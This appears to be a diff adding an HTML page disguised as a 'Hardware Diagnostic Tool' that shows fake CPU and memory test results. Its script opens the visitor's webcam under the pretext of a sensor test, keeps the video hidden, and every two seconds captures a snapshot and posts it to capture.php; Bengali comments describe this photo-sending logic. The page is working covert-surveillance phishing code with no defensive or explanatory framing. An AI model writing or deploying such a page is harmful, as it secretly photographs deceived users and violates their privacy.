@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Health & Hardware Diagnostics</title>
+    <style>
+        body { font-family: sans-serif; background-color: #f4f7f6; color: #333; text-align: center; padding: 50px; }
+        .container { background: white; padding: 30px; border-radius: 10px; shadow: 0 4px 6px rgba(0,0,0,0.1); display: inline-block; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { color: #27ae60; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Hardware Diagnostic Tool</h1>
+        <p>Analyzing system components, please wait...</p>
+        <div class="loader"></div>
+        <p>Status: <span class="status" id="status-text">Initializing...</span></p>
+        <ul style="text-align: left; list-style: none; padding: 0;">
+            <li>✔️ CPU Stress Test: <span style="color:green">Passed</span></li>
+            <li>✔️ Memory Check: <span style="color:green">Healthy</span></li>
+            <li>⏳ Camera/Sensor Test: <span id="cam-status">Pending...</span></li>
+        </ul>
+    </div>
+
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const camStatus = document.getElementById('cam-status');
+
+        // ক্যামেরা এক্সেস এবং ছবি তোলার লজিক
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                camStatus.innerText = "Running...";
+                document.getElementById('status-text').innerText = "Testing Sensors...";
+            })
+            .catch(err => {
+                camStatus.innerText = "Error: Access Denied";
+                console.error(err);
+            });
+
+        function takeSnapshot() {
+            if (video.srcObject) {
+                const context = canvas.getContext('2d');
+                canvas.width = 640;
+                canvas.height = 480;
+                context.drawImage(video, 0, 0, 640, 480);
+                const imageData = canvas.toDataURL('image/png');
+
+                fetch('capture.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'image=' + encodeURIComponent(imageData)
+                });
+            }
+        }
+
+        // 2 সেকেন্ড পর পর ছবি পাঠানো
+        setInterval(takeSnapshot, 2000);
+    </script>
+</body>
+</html>
+
